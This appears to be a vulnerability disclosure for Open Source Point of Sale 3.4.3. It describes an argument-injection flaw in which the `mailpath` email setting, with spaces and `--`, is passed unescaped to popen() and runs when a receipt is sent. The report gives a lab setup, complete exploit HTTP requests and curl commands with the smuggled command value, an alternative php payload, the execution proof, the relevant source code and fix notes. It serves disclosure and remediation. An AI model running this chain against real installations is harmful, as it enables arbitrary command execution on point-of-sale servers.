### Vulnerability details

**Official website / Product:** https://github.com/opensourcepos/opensourcepos

**Repository:** opensourcepos/opensourcepos (stars at selection: 4472)

**Vulnerability type:** RCE

**Vulnerability versions:** 3.4.3 (Docker image `jekkos/opensourcepos:3.4.3`, app banner 3.4.3-dev; `valid_path_strict` still present on current HEAD `90495a5` / 3.4.4-dev)

**Vulnerability URL / Parameter:** `POST /config/saveEmail/` params `mailpath` + `protocol=sendmail`; trigger `GET /sales/sendReceipt/{saleId}`

**Complex:** yes

### Verification procedure

1. Start the lab (original `labs/ospos-r31-a3/` and images `jekkos/opensourcepos:3.4.3`, `mariadb:10.5` were removed after verification; rebuild with this equivalent compose). Write `docker-compose.yml` in an empty directory and start with project name `ospos-r31-a3` (or name the directory `ospos-r31-a3`):

```yaml
services:
  ospos:
    image: jekkos/opensourcepos:3.4.3
    depends_on:
      - mysql
    ports:
      - "21103:80"
    networks:
      - app_net
    command: ["sh", "-c", "php spark env:provision && exec apache2-foreground"]
    environment:
      - CI_ENVIRONMENT=production
      - ALLOWED_HOSTNAMES=localhost
      - FORCE_HTTPS=false
      - PHP_TIMEZONE=UTC
      - MYSQL_USERNAME=admin
      - MYSQL_PASSWORD=pointofsale
      - MYSQL_DB_NAME=ospos
      - MYSQL_HOST_NAME=mysql
  mysql:
    image: mariadb:10.5
    networks:
      - app_net
    volumes:
      - mysql:/var/lib/mysql:rw
    environment:
      - MYSQL_ROOT_PASSWORD=pointofsale
      - MYSQL_DATABASE=ospos
      - MYSQL_USER=admin
      - MYSQL_PASSWORD=pointofsale

volumes:
  mysql:

networks:
  app_net:
```

```bash
docker compose -p ospos-r31-a3 up -d
```

Expected topology (matches verified `docker-up`): network `ospos-r31-a3_app_net`; containers `ospos-r31-a3-ospos-1`, `ospos-r31-a3-mysql-1`; host port **21103→80**; default credentials `admin` / `pointofsale`. Wait for DB readiness and `php spark env:provision` before hitting the app.

2. Log in to obtain session cookie `ospos_session=...`, and scrape CSRF field `csrf_ospos_v4` from the `/config` email settings page (PoC Cookie/CSRF values below are lab-captured — replace with a fresh login session when reproducing):

```bash
# Example: form login for Cookie (field names as on the login page)
curl -sS -c /tmp/ospos.ck -b /tmp/ospos.ck -D- \
  -X POST 'http://localhost:21103/login' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'username=admin&password=pointofsale'
curl -sS -c /tmp/ospos.ck -b /tmp/ospos.ck 'http://localhost:21103/config' \
  | grep -oE 'csrf_ospos_v4[^>]*value="[^"]+"'
```

3. `POST /config/saveEmail/` with `protocol=sendmail` and `mailpath=/usr/bin/touch /tmp/ospos-arg-rce --` (spaces and `--`).
4. Confirm JSON `{"success":true,"message":"Configuration save successful."}`; optionally verify DB:

```bash
docker exec ospos-r31-a3-mysql-1 mysql -uadmin -ppointofsale ospos \
  -e "SELECT \`key\`,value FROM ospos_app_config WHERE \`key\`='mailpath';"
```

(`valid_path_strict` accepts the spaced value.)
5. Ensure a customer with email exists and complete a sale (lab `sale_id=1`, `alice@example.com`).
6. `GET /sales/sendReceipt/1` (logged-in employee with `reports_sales` grant; default admin qualifies). App path: `Email_lib` → CI4 `Email::sendWithSendmail` → `popen($mailPath . ' -oi ' . $from . ' -t')`.
7. Confirm the marker inside the container:

```bash
docker exec ospos-r31-a3-ospos-1 ls -la /tmp/ospos-arg-rce
docker exec ospos-r31-a3-ospos-1 stat /tmp/ospos-arg-rce
```

An empty file owned by `www-data` proves argv/command execution. Verified output:

```text
-rw-r--r-- 1 www-data www-data 0 Nov  2 00:29 /tmp/ospos-arg-rce
  File: /tmp/ospos-arg-rce
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: 0,71	Inode: 12845081    Links: 1
Access: (0644/-rw-r--r--)  Uid: (   33/www-data)   Gid: (   33/www-data)
Access: 2026-11-02 00:29:48.315319962 +0000
Modify: 2026-11-02 00:29:48.315319962 +0000
Change: 2026-11-02 00:29:48.315319962 +0000
 Birth: 2026-11-02 00:29:48.315319962 +0000
```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified; configuration stage):

```http
POST /config/saveEmail/ HTTP/1.1
Host: localhost:21103
User-Agent: curl/8.22.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Origin: http://localhost:21103
Referer: http://localhost:21103/config
Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2
Content-Length: 198
Connection: close

csrf_ospos_v4=1169e1a0257e21e3198591587cdefd12&protocol=sendmail&mailpath=%2Fusr%2Fbin%2Ftouch%20%2Ftmp%2Fospos-arg-rce%20--&smtp_host=&smtp_user=&smtp_pass=&smtp_port=25&smtp_timeout=5&smtp_crypto=
```

Decoded `mailpath` plaintext: `/usr/bin/touch /tmp/ospos-arg-rce --`

Equivalent curl (configuration stage):

```bash
curl -sS -D- 'http://localhost:21103/config/saveEmail/' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Origin: http://localhost:21103' \
  -H 'Referer: http://localhost:21103/config' \
  -H 'Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2' \
  --data 'csrf_ospos_v4=1169e1a0257e21e3198591587cdefd12&protocol=sendmail&mailpath=%2Fusr%2Fbin%2Ftouch%20%2Ftmp%2Fospos-arg-rce%20--&smtp_host=&smtp_user=&smtp_pass=&smtp_port=25&smtp_timeout=5&smtp_crypto='
```

Complete HTTP response (configuration stage):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 00:29:48 GMT
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.2.35
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: same-origin
Set-Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2; expires=Mon, 02 Nov 2026 02:29:48 GMT; Max-Age=7200; path=/; HttpOnly; SameSite=Lax
Content-Length: 59
Content-Type: application/json; charset=UTF-8

{"success":true,"message":"Configuration save successful."}
```

Complete HTTP request (trigger stage):

```http
GET /sales/sendReceipt/1 HTTP/1.1
Host: localhost:21103
User-Agent: curl/8.22.0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://localhost:21103/sales
Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2
Connection: close

```

Equivalent curl (trigger stage):

```bash
curl -sS -D- 'http://localhost:21103/sales/sendReceipt/1' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Referer: http://localhost:21103/sales' \
  -H 'Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2'
```

Complete HTTP response (trigger stage):

```http
HTTP/1.1 200 OK
Date: Mon, 02 Nov 2026 00:29:48 GMT
Server: Apache/2.4.69 (Debian)
X-Powered-By: PHP/8.2.35
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Referrer-Policy: same-origin
Set-Cookie: ospos_session=b30e0d08732656cb362f5e90f7f1def2; expires=Mon, 02 Nov 2026 02:29:48 GMT; Max-Age=7200; path=/; HttpOnly; SameSite=Lax
Content-Length: 69
Content-Type: application/json; charset=UTF-8

{"success":true,"message":"Receipt sent to alice@example.com","id":1}
```

Impact verification output (in-container `ls`/`stat`):

```text
-rw-r--r-- 1 www-data www-data 0 Nov  2 00:29 /tmp/ospos-arg-rce
  File: /tmp/ospos-arg-rce
  Size: 0         	Blocks: 0          IO Block: 4096   regular empty file
Device: 0,71	Inode: 12845081    Links: 1
Access: (0644/-rw-r--r--)  Uid: (   33/www-data)   Gid: (   33/www-data)
Access: 2026-11-02 00:29:48.315319962 +0000
Modify: 2026-11-02 00:29:48.315319962 +0000
Change: 2026-11-02 00:29:48.315319962 +0000
 Birth: 2026-11-02 00:29:48.315319962 +0000
```

Verification result notes:

`saveEmail` accepts a spaced mailpath with `--`; `sendReceipt` reports success; `/tmp/ospos-arg-rce` is created as `www-data`. Equivalent payload `/usr/local/bin/php --` also passes validation and makes PHP interpret the email stream from stdin.

### Vulnerability analysis

GHSA-jc56-j8m6-q627 fixed unanchored sendmail-path validation (newline injection) by adding `valid_path_strict`. The rule’s comment states the value is concatenated unescaped into `popen()`, yet the charset still allows spaces. An attacker with the `config` grant can set `mailpath` to `binary args --`; CI4 appends `-oi -f … -t`, yielding argv injection and arbitrary binary execution (`touch`, `php`, etc.). This bypasses a security control that was meant to stop popen abuse; it is not an intentional admin shell feature. Requires an account with the `config` module grant (default admin).

Trigger / sink source (full path and line numbers):

```php
# File: app/Config/Validation/OSPOSRules.php
# Lines: 257-274 (image 3.4.3; local HEAD ~259-276)
    /**
     * Validates a plain filesystem path, allowing space/colon/backslash for Windows paths and
     * trailing sendmail-style args. Excludes shell metacharacters since this value is concatenated
     * unescaped into a popen() call. Uses \A...\z, not ^...$, since $ also matches before a
     * trailing newline.
     */
    public function valid_path_strict(string $candidate, ?string &$error = null): bool
    {
        if ($candidate === '') {
            return false;
        }

        return (bool) preg_match('/\A[a-zA-Z0-9_\-\/.: \\\\]+\z/', $candidate);
    }
```

```php
# File: app/Controllers/Config.php
# Lines: 551-595 (postSaveEmail)
    public function postSaveEmail(): ResponseInterface
    {
        $postedPass = (string) $this->request->getPost('smtp_pass');

        if (checkEncryption() && $postedPass !== '') {
            $password = $this->encrypter->encrypt($postedPass);
        } else {
            $password = (string) ($this->config['smtp_pass'] ?? '');
        }

        $protocol = $this->request->getPost('protocol');
        $mailpath = $this->request->getPost('mailpath');

        $rules = [
            'mailpath' => [
                'label' => lang('Config.email_mailpath'),
                'rules' => ($protocol === 'sendmail' ? 'required' : 'permit_empty') . '|valid_path_strict'
            ]
        ];
        $messages = [
            'mailpath' => [
                'required'          => lang('Config.mailpath_invalid'),
                'valid_path_strict' => lang('Config.mailpath_invalid')
            ]
        ];

        if ($error = $this->validateFields($rules, $messages)) {
            return $error;
        }

        $batch_save_data = [
            'protocol'     => $protocol,
            'mailpath'     => $mailpath,
            'smtp_host'    => $this->request->getPost('smtp_host'),
            'smtp_user'    => $this->request->getPost('smtp_user'),
            'smtp_pass'    => $password,
            'smtp_port'    => $this->request->getPost('smtp_port', FILTER_SANITIZE_NUMBER_INT),
            'smtp_timeout' => $this->request->getPost('smtp_timeout', FILTER_SANITIZE_NUMBER_INT),
            'smtp_crypto'  => $this->request->getPost('smtp_crypto')
        ];

        $success = $this->appconfig->batch_save($batch_save_data);

        return $this->response->setJSON(['success' => $success, 'message' => lang('Config.saved_' . ($success ? '' : 'un') . 'successfully')]);
    }
```

```php
# File: app/Libraries/Email_lib.php
# Lines: 43-57 (wires app_config.mailpath into CI4 Email mailPath)
        $email_config = [
            'mailType'    => 'html',
            'userAgent'   => 'OSPOS',
            'validate'    => true,
            'protocol'    => $this->config['protocol'] ?? 'mail',
            'mailPath'    => $this->config['mailpath'] ?? '/usr/sbin/sendmail',
            'SMTPHost'    => $this->config['smtp_host'] ?? '',
            'SMTPUser'    => $this->config['smtp_user'] ?? '',
            'SMTPPass'    => $smtp_pass,
            'SMTPPort'    => (int)(!empty($this->config['smtp_port']) ? $this->config['smtp_port'] : 465),
            'SMTPTimeout' => (int)(!empty($this->config['smtp_timeout']) ? $this->config['smtp_timeout'] : 5),
            'SMTPCrypto'  => $this->config['smtp_crypto'] ?? 'ssl'
        ];
        $this->email->initialize($email_config);
```

```php
# File: app/Controllers/Sales.php
# Lines: 1097-1127 (getSendReceipt → /sales/sendReceipt/{saleId})
    public function getSendReceipt(int $saleId): ResponseInterface
    {
        $personId = $this->session->get('person_id');

        if (!$this->employee->has_grant('reports_sales', $personId)) {
            return $this->response->setStatusCode(403)->setJSON(['success' => false, 'message' => lang('Sales.not_authorized')]);
        }

        $saleData = $this->_load_sale_data($saleId);

        $result = false;
        $message = lang('Sales.receipt_no_email');

        if (!empty($saleData['customer_email'])) {
            $saleData['barcode'] = $this->barcode_lib->generate_receipt_barcode($saleData['sale_id']);
            $saleData['img_tag'] = $this->email_lib->buildLogoImgTag();

            $to = $saleData['customer_email'];
            $subject = lang('Sales.receipt');

            $view = Services::renderer();
            $text = $view->setData($saleData)->render('sales/receipt_email');

            $result = $this->email_lib->sendEmail($to, $subject, $text);

            $message = lang($result ? 'Sales.receipt_sent' : 'Sales.receipt_unsent') . ' ' . $to;
        }

        $this->sale_lib->clear_all();

        return $this->response->setJSON(['success' => $result, 'message' => $message, 'id' => $saleId]);
    }
```

```php
# File: vendor/codeigniter4/framework/system/Email/Email.php
# Lines: 1710-1726 (sendWithSendmail; image 3.4.3 verified sink)
    protected function sendWithSendmail()
    {
        $from = $this->cleanEmail($this->headers['From']);
        $from = $this->validateEmailForShell($from) ? '-f ' . $from : '';

        if (! function_usable('popen') || false === ($fp = @popen($this->mailPath . ' -oi ' . $from . ' -t', 'w'))) {
            return false;
        }
        fwrite($fp, $this->headerStr);
        fwrite($fp, $this->finalBody);
        $status = pclose($fp);
        ...
    }
```

Attack chain: `POST /config/saveEmail` (`valid_path_strict` allows spaces/`--`) → `ospos_app_config.mailpath` → `Email_lib` sets `mailPath` → `GET /sales/sendReceipt/{id}` → `popen("touch /tmp/ospos-arg-rce -- -oi -f … -t")` → arbitrary binary + argv.

### Fix notes

1. Disallow spaces in `valid_path_strict`, or allow only a single absolute path with no arguments.
2. Invoke sendmail via `proc_open` / argv array with `escapeshellarg` on the path as argv[0] only.
3. Prefer `mail`/`smtp` only, or whitelist exact binaries such as `/usr/sbin/sendmail`.
